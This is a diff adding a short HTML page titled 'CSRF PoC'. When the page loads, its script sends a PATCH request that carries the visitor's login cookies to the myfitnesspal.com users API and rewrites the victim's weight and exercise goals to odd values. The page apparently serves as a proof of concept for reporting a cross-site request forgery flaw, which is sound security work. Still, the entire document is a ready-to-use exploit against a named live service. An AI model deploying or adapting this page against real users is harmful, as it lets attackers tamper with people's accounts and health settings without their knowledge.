@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CSRF PoC</title>
+</head>
+<body>
+<script>
+fetch("https://www.myfitnesspal.com/api/services/users", {
+  method: "PATCH",
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    item: {
+      goal_preferences: {
+        weight_change_goal: {
+          value: -13,
+          unit: "pounds"
+        },
+        weight_goal: {
+          value: 12,
+          unit: "pounds"
+        },
+        weekly_exercise_energy: {
+          value: -70,
+          unit: "calories"
+        }
+      }
+    }
+  })
+});
+</script>
+</body>
+</html>
